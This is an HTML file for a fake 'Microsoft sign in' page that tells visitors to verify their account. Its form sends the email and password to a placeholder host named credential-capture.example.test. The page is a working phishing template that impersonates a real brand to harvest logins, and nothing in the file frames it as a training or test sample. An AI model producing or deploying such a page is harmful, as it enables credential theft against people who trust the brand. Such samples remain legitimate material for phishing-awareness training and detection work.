<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Microsoft Account Verification</title>
    <style>
      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        font-family: Arial, sans-serif;
        background: #f3f6fb;
        color: #17202a;
      }

      main {
        width: min(380px, calc(100vw - 32px));
        padding: 24px;
        border: 1px solid #d8dee6;
        border-radius: 8px;
        background: #ffffff;
      }

      label,
      input,
      button {
        display: block;
        width: 100%;
      }

      label {
        margin-top: 14px;
        font-weight: 700;
      }

      input {
        margin-top: 6px;
        min-height: 38px;
      }

      button {
        min-height: 40px;
        margin-top: 18px;
      }
    </style>
  </head>
  <body>
    <main>
      <h1>Microsoft sign in</h1>
      <p>Verify your account to continue.</p>
      <form method="post" action="https://credential-capture.example.test/session" autocomplete="off">
        <label for="email">Email</label>
        <input id="email" name="email" type="email" autocomplete="username" />

        <label for="password">Password</label>
        <input id="password" name="password" type="password" autocomplete="current-password" />

        <button type="submit">Sign in</button>
      </form>
    </main>
  </body>
</html>
